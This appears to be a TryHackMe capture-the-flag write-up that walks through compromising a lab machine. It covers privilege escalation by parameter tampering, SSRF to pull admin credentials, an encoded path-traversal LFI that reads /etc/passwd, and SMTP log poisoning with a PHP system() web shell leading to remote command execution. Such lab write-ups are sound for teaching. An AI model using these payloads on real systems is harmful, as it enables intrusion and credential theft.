# TryHackMe

**Steps to Reproduce**

**🔹 Reconnaissance and Service Enumeration**

The first step in the assessment was conducting a port scan to identify open services using **Naabu** and **Nmap**.

<aside>
💡

naabu -host < target  >

</aside>

![naabu.png](TryHackMe%2018047c97d4b381cea484e5e20b81d537/naabu.png)

This show  No open ports were detected for the web application.

To obtain more details, an **Nmap** scan was performed:

<aside>
💡

nmap -sV -sC -Pn < target > -oN <file_name>

</aside>

![all.png](TryHackMe%2018047c97d4b381cea484e5e20b81d537/all.png)

This detect there exist 2 open ports to access web server 

**🔹 Web Application Analysis**

**Accessing the First Web Application (Port 50000)**

![50000.png](TryHackMe%2018047c97d4b381cea484e5e20b81d537/50000.png)

![login1.png](TryHackMe%2018047c97d4b381cea484e5e20b81d537/login1.png)

Attempting to log in using the default credentials (`admin:admin`) was unsuccessful. Additionally, SQL Injection attempts to bypass authentication failed.

![error.png](TryHackMe%2018047c97d4b381cea484e5e20b81d537/error.png)

**Accessing the Second Web Application (Port 4000)**

![4000.png](TryHackMe%2018047c97d4b381cea484e5e20b81d537/4000.png)

A new login attempt was made using `guest:guest`, which was successful.

![index_4000.png](TryHackMe%2018047c97d4b381cea484e5e20b81d537/index_4000.png)

![de.png](TryHackMe%2018047c97d4b381cea484e5e20b81d537/de.png)

Upon logging in, the **View Profile** section was analyzed. A key parameter **`isAdmin`** was found, indicating potential privilege escalation. Since the only available input field was in the **Recommend an Activity** section, various payloads were tested.

![tesr1.png](TryHackMe%2018047c97d4b381cea484e5e20b81d537/tesr1.png)

This Redirect to the /friend/1 and add test:test

![res.png](TryHackMe%2018047c97d4b381cea484e5e20b81d537/res.png)

![before.png](TryHackMe%2018047c97d4b381cea484e5e20b81d537/before.png)

<aside>
💡

activityType=isAdmin&activityName=true

</aside>

![after.png](TryHackMe%2018047c97d4b381cea484e5e20b81d537/after.png)

yes, Successfully elevated privileges.

![api.png](TryHackMe%2018047c97d4b381cea484e5e20b81d537/api.png)

Upon further analysis of the application settings, a feature allowed users to update the **Banner Image** by providing a URL. This indicated a possible **Server-Side Request Forgery (SSRF)** vulnerability

![settings.png](TryHackMe%2018047c97d4b381cea484e5e20b81d537/settings.png)

Initial SSRF attempts:

<aside>
💡

url=http://127.0.0.1:5000

</aside>

 this only return **Internal Server Error** 

then use url=http://127.0.0.1:5000/internal-api this return 302 found and redirect into admin/settings

![firsr.png](TryHackMe%2018047c97d4b381cea484e5e20b81d537/firsr.png)

let’s decode this by burp Decoder

![super.png](TryHackMe%2018047c97d4b381cea484e5e20b81d537/super.png)

this detect it’s very confidential information. but we need username and password for admin to access into  SysMon app so I try another endpoint

url=`http://127.0.0.1:5000/getAllAdmins101099991`

this return another encode data 

![data_admin.png](TryHackMe%2018047c97d4b381cea484e5e20b81d537/data_admin.png)

let’s decode this 

![secrerrrrt.png](TryHackMe%2018047c97d4b381cea484e5e20b81d537/secrerrrrt.png)

yes, it’s contain very important data that can use it to access into SysMonApp and ReviewApp

let’s return into SysMonApp and login to see what exist

![flag_1.png](TryHackMe%2018047c97d4b381cea484e5e20b81d537/flag_1.png)

Boom, we get first Flag, after this make fuzz to discover hidden files or directories by fuff

```bash
$ ffuf -u <target> -w < wordlist> 
I use  /usr/share/wordlists/dirb/common.txt
```

![hidden_dir.png](TryHackMe%2018047c97d4b381cea484e5e20b81d537/hidden_dir.png)

I check  uploads  directory

![uploads.png](TryHackMe%2018047c97d4b381cea484e5e20b81d537/uploads.png)

this show that store profile image so I search for endpoint that allow to me to upload image 

so I Inspect image and see 

<aside>
💡

profile.php?img=profile.png

</aside>

![image.png](TryHackMe%2018047c97d4b381cea484e5e20b81d537/image.png)

**Testing LFI:**

<aside>
💡

profile.php?img=../../etc/passwd

</aside>

that not success then try bypass it by null bytes
`/.%00./.%00./etc/passwd` and this not success so I try another techique

…./…./…./etc/passwd and not success  

finally I try chain with local file Inclusion and use url encoding

<aside>
💡

profile.php?img=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd

</aside>

yes, its success 

![result.png](TryHackMe%2018047c97d4b381cea484e5e20b81d537/result.png)

now we need to do RCE so I used this reference that help me to ****LFI to RCE via SMTP Log File Poisoning techiques 

[https://github.com/RoqueNight/LFI---RCE-Cheat-Sheet](https://github.com/RoqueNight/LFI---RCE-Cheat-Sheet)

**Steps to Achieve RCE:**

1. open a Telnet session to the target’s SMTP service as it’s open:
    
    <aside>
    💡
    
    telnet <  target_ip > 25
    
    </aside>
    

1. inject a malicious PHP payload:
    
    <aside>
    💡
    
    MAIL FROM: <toor@gmail.com>
    
    REPT TO : <?php  system($_GET[’c’] ) ; ? >
    
    </aside>
    
    ![mail.png](TryHackMe%2018047c97d4b381cea484e5e20b81d537/mail.png)
    

3.Execute the command :

<aside>
💡

http://<target_ip>:50000/profile.php?img=....%2F%2F....%2F%2Fvar%2Flog%2fmail.log&c=id

</aside>

![request.png](TryHackMe%2018047c97d4b381cea484e5e20b81d537/request.png)

![response.png](TryHackMe%2018047c97d4b381cea484e5e20b81d537/response.png)

**it’s success let get the flag**

show files and directories

<aside>
💡

http://<target_ip>:50000/profile.php?img=....%2F%2F....%2F%2Fvar%2Flog%2fmail.log&c=ls

</aside>

![lscommand.png](TryHackMe%2018047c97d4b381cea484e5e20b81d537/lscommand.png)

![files.png](TryHackMe%2018047c97d4b381cea484e5e20b81d537/files.png)

**use this command to show content of files**

<aside>
💡

c=cat${IFS}505eb0fb8a9f32853b4d955e1f9123ea.txt

I use ${IFS} to remove space 

</aside>

![rootFlagyessss.png](TryHackMe%2018047c97d4b381cea484e5e20b81d537/rootFlagyessss.png)